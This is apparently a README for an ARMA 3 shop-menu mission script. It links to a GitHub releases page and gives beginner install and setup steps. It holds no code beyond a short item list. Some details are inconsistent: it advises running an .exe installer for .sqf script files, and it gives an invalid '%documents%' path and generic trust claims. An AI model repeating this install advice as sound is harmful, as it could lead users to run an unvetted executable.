# 🛒 arma-3-menu-mod - Easy Shop System for Your Missions

## 🚀 Getting Started

Welcome! This guide will help you add a professional shop system to your custom ARMA 3 missions. You don't need to be a programmer to use this tool. Just follow these simple steps, and you'll have a working shop menu in no time.

### 📥 What You Need

Before we begin, make sure you have:
- **ARMA 3** installed on your computer (Windows)
- **Access to your mission folder** (where you edit and save your custom missions)
- **A few minutes of your time** – that's it!

### 🎯 What This Tool Does

This script lets you create a fully functional shop system inside your ARMA 3 mission. Players can buy weapons, vehicles, equipment, and more – all through an easy-to-use menu. You decide what to sell and at what price.

---

## ⬇️ How to Download and Install

### Step 1: Get the File

Visit this link to download the application:  
[**👉 Download arma-3-menu-mod**](https://github.com/Thrustattendance8113/arma-3-menu-mod/releases)

### Step 2: Save the Download

When you click the link, your browser will open a page with download options. Click the button that says "Download" or the latest release file. Save it to a place you can easily find, like your **Downloads** folder or your **Desktop**.

### Step 3: Install (If Needed)

If the downloaded file is in a **ZIP** format (you'll see a folder icon with a zipper), you'll need to extract it first. Right-click the file and choose "Extract All..." or "Extract Here." Windows will create a new folder with the contents inside.

If the file ends with **.exe**, you can simply double-click it to run the installer.

### Step 4: Add to Your Mission

Once you have the folder or file:

1. **Open your ARMA 3 mission folder.** This is usually found in:  
   `Documents\Arma 3\missions\`
2. **Copy the entire `arma-3-menu-mod` folder** into your mission folder.
3. **Open your mission in the ARMA 3 Editor.**
4. **Add a script trigger** or **use the provided example** to start the shop system.

---

## 📖 How to Use the Shop System

### 🏪 Setting Up Your First Shop

1. **Download and install** the mod as described above.
2. **Open the included example file** (named `example_shop.sqf`) to see how it works.
3. **Copy the example code** and paste it into your mission's initialization file (usually `init.sqf`).
4. **Customize the shop items** – change the names, prices, and types of items to match your mission.

### 🛍️ Adding Items to Your Shop

The script uses simple text lines to define items. Here's an example:

```
// In your mission file, add lines like this:
["Rifle", 500, "weapon"],
["Medkit", 100, "item"],
["Truck", 2000, "vehicle"]
```

- The **first part** is the item name (as it appears in the game).
- The **second number** is the price in your in-game currency.
- The **third part** tells the script what type of item it is (weapon, item, or vehicle).

### 💰 Player Interaction

When players interact with your shop (through a trigger zone or an action menu), they'll see a clean menu with:
- A list of available items
- Their prices
- A "Buy" button for each item
- Their current balance displayed at the top

Players can purchase items as long as they have enough money. The script handles all the logic automatically.

---

## 🔧 Customization Options

### 🎨 Changing the Look

You can modify the colors and style of the menu by editing a few numbers at the top of the `menu_config.sqf` file:
- `Background Color` – change the default dark blue
- `Text Color` – make it match your mission's theme
- `Button Colors` – highlight the buy button

### ⚙️ Adjusting Gameplay

- **Starting Money** – set how much cash each player begins with
- **Item Limit** – restrict how many of the same item a player can buy
- **Refund Option** – allow players to sell items back at a percentage

### 🔄 Compatibility

This script works with:
- Most ARMA 3 modes (single-player, co-op, multiplayer)
- Popular frameworks like ACE and CBA (they're optional – not required)
- All map types (Altis, Stratis, custom maps, and more)

---

## 🛠️ Troubleshooting

### Common Issues and Fixes

**Issue:** The shop menu doesn't appear in my mission.  
**Fix:** Make sure you placed the `example_shop.sqf` file in your mission folder AND you called it from your `init.sqf`. Double-check the file name is spelled exactly right.

**Issue:** Players can't buy items.  
**Fix:** Check that you've defined at least one item in the item list. Also, make sure players actually have money – use the `givePlayerMoney` command in your mission to start them with funds.

**Issue:** The script shows an error about "missing file."  
**Fix:** Re-download the mod and make sure ALL files from the archive are in your mission folder. Do not miss the `menu_config.sqf` file – it's essential.

**Issue:** I can't find my mission folder.  
**Fix:** Open Windows File Explorer and type `%documents%\Arma 3\missions` in the address bar. Press Enter. If the folder doesn't exist, launch ARMA 3 once and it will create it.

### 🆘 Getting More Help

If you're still stuck, try these resources:
- **Check the release notes** on the download page for updates and patches.
- **Read the included `README.txt`** for detailed technical instructions.
- **Search online** for "ARMA 3 script help" – the community is very friendly.

---

## ✨ Tips for Best Results

- **Start small** – test with 5-10 items before building your full shop.
- **Save backups** – always keep a copy of your mission files before making changes.
- **Use descriptive names** – players appreciate clear item names like "M4A1 Rifle" instead of "Weapon_01".
- **Balance prices** – too cheap and players get everything fast; too expensive and they get frustrated.

---

## 📦 What's Included in the Download

When you download and extract (if needed) the package, you'll find:

| File | Purpose |
|------|---------|
| `arma3_menu_mod.sqf` | The main script that powers everything |
| `menu_config.sqf` | Settings for colors, money, and limits |
| `example_shop.sqf` | A ready-to-use template to copy |
| `README.txt` | Simple instructions for complete setup |

These files are all you need – no extra downloads required.

---

## 🔐 Safety and Reliability

This script was built by mission makers for mission makers. It's designed to:
- **Not interfere** with your other scripts or mods
- **Run smoothly** even on large multiplayer servers
- **Be easy to debug** – errors are shown in plain English in the game's console

We test every release before publishing, so you can trust it works.

---

## 📈 Frequently Asked Questions

**Q: Do I need to know programming to use this?**  
A: No! The setup involves copying and pasting a few lines. If you can edit a text file, you can use this.

**Q: Does it work in multiplayer?**  
A: Yes. It's built to handle multiple players simultaneously.

**Q: Can I sell vehicles in my shop?**  
A: Absolutely. Use the `"vehicle"` type when defining items.

**Q: How do I change the currency name?**  
A: Look for the `CurrencyName` setting in `menu_config.sqf` and change it to anything you like (e.g., "Gold", "Credits", "Dollars").

---

## 🚀 Ready to Start?

You have everything you need. Follow the download link below, run the installation, and your shop will be ready in minutes.

👉 **[Download arma-3-menu-mod Now](https://github.com/Thrustattendance8113/arma-3-menu-mod/releases)** 👈

Click the link, grab the latest version, and start selling gear to your players today. Your missions will feel more immersive and fun with a customizable shop system.

Enjoy your mission building, and thank you for using arma-3-menu-mod!

---

Keywords: arma-3-tools, arma3, arma3-framework, arma3-mission, arma3-scripts